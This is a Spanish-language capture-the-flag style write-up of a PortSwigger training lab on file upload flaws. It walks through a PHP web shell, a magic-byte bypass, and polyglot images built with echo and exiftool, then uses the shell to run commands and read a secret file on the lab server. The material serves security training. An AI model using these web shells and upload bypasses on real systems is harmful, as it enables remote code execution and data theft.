---
title: Remote code execution via polyglot web shell upload
description: Laboratorio de Portswigger sobre File Upload Vulnerabilities
date: 2024-11-25 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - File Upload Vulnerabilities
tags:
  - Portswigger Labs
  - File Upload Vulnerabilities
  - Remote code execution via polyglot web shell upload
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable`, aunque `verifica` el `contenido` del `archivo` para `confirmar` que es una imagen `genuina`, aún es posible cargar y `ejecutar código` del `lado` del `servidor`. Para resolver el laboratorio, debemos subir una web shell básica en `PHP`, utilizarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` con nuestra propia cuenta utilizando las siguientes credenciales: `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_1.png)

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_2.png)

Vemos que existe un `campo` de `subida` de `archivos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_3.png)

Si `inspeccionamos` con `donde` se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_4.png)

Nos creamos un archivo llamado `shell.php` y lo `subimos`

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Al subir el archivo nos sale un error

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_5.png)

`Subimos` el `archivo` nuevamente pero `capturamos` la `petición` con `Burspuite`, he probado a subir un archivo con `extensión .png` y con `Content-type: image:/png` pero nos sigue dando el mismo `error`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_6.png)

Esto puede ser debido a los `magic bytes` que tienen las imágenes [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), en este caso he añadido `GIF8;` lo cual me ha permitido `bypassear` la `validación`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_7.png)

Una forma diferente de hacerlo sería `descargar` una `imagen` e `introducir` la `web shell` dentro. Al `capturar` la `petición` con `Burpsuite` se cambiaría la `extensión` de archivo a `.php` y se `enviaría`

```
# echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

Otra alternativa sería `inyectando metadados dentro de una imagen` mediante `exiftool`. Mediante esta `herramienta` podemos `listar` los `metadatos` de una `imagen`

```
exiftool image.jpg
ExifTool Version Number         : 13.25
File Name                       : image.jpg
Directory                       : .
File Size                       : 62 kB
File Modification Date/Time     : 2025:11:08 20:29:46+01:00
File Access Date/Time           : 2025:11:08 20:30:27+01:00
File Inode Change Date/Time     : 2025:11:08 20:30:21+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Image Width                     : 800
Image Height                    : 800
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x800
Megapixels                      : 0.640
```

Con este comando `añadimos` un `comentario` a la `imagen` en el cual `inyectamos código php`. He probado 

```
# exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o image_polyglot.php
```

Si `inspeccionamos` el `archivo creado` vemos que se ha `insertado` un `nuevo comentario` con nuestro `payload`

```
# exiftool image_polyglot.php                                                       
ExifTool Version Number         : 13.25
File Name                       : image_polyglot.php
Directory                       : .
File Size                       : 63 kB
File Modification Date/Time     : 2025:11:09 11:24:08+01:00
File Access Date/Time           : 2025:11:09 11:24:08+01:00
File Inode Change Date/Time     : 2025:11:09 11:24:08+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : <?php system($_GET["cmd"]); ?>
Image Width                     : 800
Image Height                    : 800
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 800x800
Megapixels                      : 0.640
```

Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se `aloja` en `/files/avatars`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_8.png)

Si accedemos a `https://0aff00d7043967af80eda8750079008a.web-security-academy.net/files/avatars/shell.php?cmd=whoami` vemos que hemos logrado un `RCE (Remote Code Execution)`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_9.png)

`Listamos` el `contenido` de la `home` de carlos `https://0aff00d7043967af80eda8750079008a.web-security-academy.net/files/avatars/shell.php?cmd=ls%20/home/carlos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_10.png)

`Obtenemos` el `contenido` del archivo secret `https://0aff00d7043967af80eda8750079008a.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_11.png)

`Submiteamos` la `solución`

![](/assets/img/File-Upload-Vulnerabilities-Lab-6/image_12.png)
